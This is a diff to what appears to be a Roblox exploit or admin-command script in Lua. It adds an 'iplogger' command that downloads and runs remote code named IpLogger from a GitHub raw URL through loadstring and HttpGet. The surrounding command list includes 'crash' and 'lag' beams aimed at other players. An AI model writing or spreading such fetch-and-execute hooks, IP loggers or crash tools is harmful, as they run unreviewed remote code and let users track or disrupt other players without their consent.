@@ -515,6 +515,7 @@ Cmd[#Cmd + 1] =	{Text = "antifell / antivoid",Title = "Activate anti fell to the
 Cmd[#Cmd + 1] =	{Text = "unantifell / unantivoid",Title = "Unactivate anti fell to the void when respawn as custom team"}
 Cmd[#Cmd + 1] =	{Text = "beam [plr]",Title = "Shoot a beam to player"}
 Cmd[#Cmd + 1] =	{Text = "spookyware",Title = "Executes SpookyWare Hub, Aliasses reanim1"}
+Cmd[#Cmd + 1] =	{Text = "iplogger",Title = "Executes IpLogger, Aliasses iplog"}
 Cmd[#Cmd + 1] =	{Text = "lagbeam / beam2 [plr]",Title = "Shoot a beam to player but lag"}
 Cmd[#Cmd + 1] =	{Text = "crash / beam3 [plr]",Title = "Shoot a beam to player but even more lag"}
 Cmd[#Cmd + 1] = {Text = "antispamarrest",Title = "Activate anti spam arrest"}
@@ -1711,6 +1712,9 @@ end
 	end
 	if Command("spookyware") or Command("reanim1") then
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/SpookyWare'),true))()
+	end
+	if Command("iplogger") or Command("iplog") then
+	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/IpLogger'),true))()
 	end
 
 	if Command("fly") then
